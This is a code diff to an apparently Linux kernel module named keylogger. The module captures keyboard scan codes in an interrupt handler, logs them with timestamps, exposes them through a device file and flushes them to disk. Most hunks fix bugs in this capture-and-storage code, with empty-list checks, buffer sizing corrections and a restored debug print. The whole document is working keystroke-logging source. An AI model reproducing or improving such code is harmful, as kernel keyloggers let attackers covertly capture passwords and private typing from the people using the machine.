@@ -22,8 +22,7 @@ static struct fsm scan_fsm = {
 
 LIST_HEAD(keystroke_list);
 
-/* Multiples fd sync and protect */
-/* multi buffer, multi flush ? */
+/* Assumption : multi buffer, multi flush  */
 
 int	keylogger_open(struct inode *inode, struct file *filp)
 {
@@ -41,16 +40,19 @@ int	keylogger_open(struct inode *inode, struct file *filp)
 	}
 	read_unlock(&keylist_rwlock);
 
+	if (size == 0) {
+		retval = -ENODATA;
+		goto err;
+	}
+
 	printk(KERN_INFO "nbr entries %lu\n", size);
-	/* change the way it's calculed */
-	/* new size + krealloc */
 	if (!(klg_buffer = kmalloc(60 * size + 1, GFP_KERNEL))) {
 		retval = -ENOMEM;
 		goto err;
 	}
 
 	memset(tmp, 0, 60);
-	memset(klg_buffer, 0, 60 * size);
+	memset(klg_buffer, 0, 60 * size + 1);
 	read_lock(&keylist_rwlock);
 	list_for_each_entry(ks, &keystroke_list, list) {
 		written = sprintf(tmp, "[%04d-%02d-%02d %02d:%02d:%02d] %s %s %x\n", ks->tm.tm_year + 1900,
@@ -60,10 +62,9 @@ int	keylogger_open(struct inode *inode, struct file *filp)
 	}
 	read_unlock(&keylist_rwlock);
 
-	/* init dev->size to length of klg_buffer */
-	/* klg_buffer should be local to device */
-
 	filp->private_data = klg_buffer;
+
+	return retval;
 err:
 	return retval;
 }
@@ -87,11 +88,12 @@ ssize_t keylogger_read(struct file *filp, char __user *buffer,
 	size_t		s;
 	char		*klg_buffer = filp->private_data;
 
-	/* read semaphore or spinlock */
-
-	printk(KERN_INFO "keylogger_read [%s]", klg_buffer);
-	/* size of buffer is dynamic */
 	s = strlen(klg_buffer);
+	if (s == 0) {
+		retval = -ENODATA;
+		goto out;
+	}
+
 	if (*offset == s)
 		goto out;
 
@@ -126,7 +128,6 @@ static struct miscdevice keylogger_misc = {
 };
 
 /* Assumption : if windex overrun rindex then static size is too small  */
-/* To be revised */
 
 static void do_tasklet(unsigned long unused)
 {
@@ -139,7 +140,7 @@ static void do_tasklet(unsigned long unused)
 		read_lock(&keyboard_rwlock);
 		packet = scan_array[rindex++];
 		read_unlock(&keyboard_rwlock);
-		/* printk(KERN_INFO "tasklet : [%x]\n", packet); */
+		printk(KERN_INFO "tasklet : [%x]\n", packet);
 		if (!(rindex = (rindex == SIZE) ? 0 : rindex))
 			target = windex;
 		scan_fsm_update(&scan_fsm, packet);
@@ -151,18 +152,15 @@ static void do_tasklet(unsigned long unused)
 }
 DECLARE_TASKLET(keyboard_tasklet, do_tasklet, 0);
 
-
-/* Assumption : an interrupt handler shouldn't be intterupted by another one on same line */
+/* Assumption : an interrupt handler shouldn't be interrupted by another one on same line */
 
 irqreturn_t	keyboard_interrupt(int irq, void *dev_id)
 {
 	unsigned int scan_code = 0;
 
 	/* clearing bit for interrupts ? */
-	/* get time of day */
 	scan_code = inb(KEYBOARD_PORT);
 	if (scan_code) {
-		/* format packet */
 		if (windex + 1 >= SIZE)
 			windex = -1;
 		write_lock(&keyboard_rwlock);
@@ -209,12 +207,9 @@ static void		ks_list_flush(void)
 	struct file		*file;
 	mm_segment_t		old_fs;
 	loff_t			off = 0;
-	int			fd;
 	ssize_t			size = 0;	
 	char			*buf = NULL;
-	char			*tokens;
 	char			*tmp;
-	char			*str;
 	
 	list_for_each(pos, &keystroke_list) {
 		size++;
@@ -241,10 +236,6 @@ static void		ks_list_flush(void)
 	}
 	filp_close(file, 0);
 	set_fs(old_fs);
-/*	tokens = "\r";
-	while ((str = strsep(&buf, tokens)))
-		printk(KERN_INFO "%s\n", str);
-*/
 	kfree(tmp);
 err:
 	return;
